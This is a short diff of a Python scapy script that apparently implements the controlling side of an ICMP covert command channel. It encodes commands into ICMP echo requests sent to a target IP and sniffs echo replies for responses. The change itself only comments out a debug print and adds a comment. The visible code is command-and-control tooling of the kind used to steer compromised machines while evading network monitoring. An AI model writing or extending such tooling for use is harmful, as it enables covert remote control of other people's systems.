@@ -11,7 +11,7 @@ def send_command(target_ip, command):
     encoded_command = encode_data(identifier + command)
     packet = IP(dst=target_ip)/ICMP(type="echo-request")/encoded_command
     sr1(packet, timeout=1, verbose=0)
-    print(f"Sent command to client: {command}")
+    #print(f"Sent command to client: {command}") # Uncomment for debugging
 
 def process_packet(packet):
     if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # ICMP Echo Reply
@@ -24,7 +24,7 @@ def process_packet(packet):
         except Exception as e:
             print(f"Error processing response: {e}")
 
-def start_sniffing(target_ip):
+def start_sniffing(target_ip): # subprocess for sniffing incoming ICMP packets
     sniff(filter=f"icmp and src host {target_ip}", prn=process_packet)
 
 def main():
